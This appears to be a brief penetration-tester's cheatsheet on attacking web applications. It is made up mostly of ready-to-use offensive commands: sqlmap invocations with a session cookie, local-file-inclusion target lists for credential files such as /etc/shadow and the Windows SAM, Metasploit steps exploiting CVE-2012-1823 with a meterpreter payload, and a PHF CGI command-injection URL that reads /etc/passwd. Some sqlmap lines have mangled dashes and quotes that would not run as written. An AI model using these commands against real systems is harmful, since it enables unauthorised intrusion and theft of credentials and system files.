# Attacking Web Applications

## Burp Extentions


## SQL Injection


## SQLMap Cheatsheet
```
#GET Request Injection
sqlmap –cookie=”OV3176019645=7a1p0ilqfud0s0dhdf0p5pqog4″ –url=”http://10.xx.xx.73:8080/php/index.php?tg=site&idx=menusite&item=2&#8243; -p item –proxy=http://127.0.0.1:8081

#POST Request Injection
sqlmap -r sqlmap_request2 -p txtLoginID
```


## Exfiltrate Linux Files - Local File Inclusion
```
/etc/issue
/proc/version
/etc/profile
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/var/spool/cron/crontabs/root

...log files
```

## Exfiltrate Windows Files - Local File Inclusion
```
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\repair\SAM
%WINDIR%\win.ini
%SYSTEMDRIVE%\boot.ini
%WINDIR%\Panther\sysprep.inf
%WINDIR%\system32\config\AppEvent.Evt
```

## PHP CGI-Bin Exploits
```
# Detecting / Explout PHP CGI Bug - [CVE-2012-1823]
nmap -p80 --script http-cve2012-1823
msf> use exploit/multi/http/php_cgi_arg_injection
msf> set rhost [HOST_IP]
msf> set PAYLOAD php/meterpreter/bind_tcp
msf> exploit
```

```
# PHF CGI Remote Command Execution - [CVE-1999-0067]
http://www.thesite.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd


```
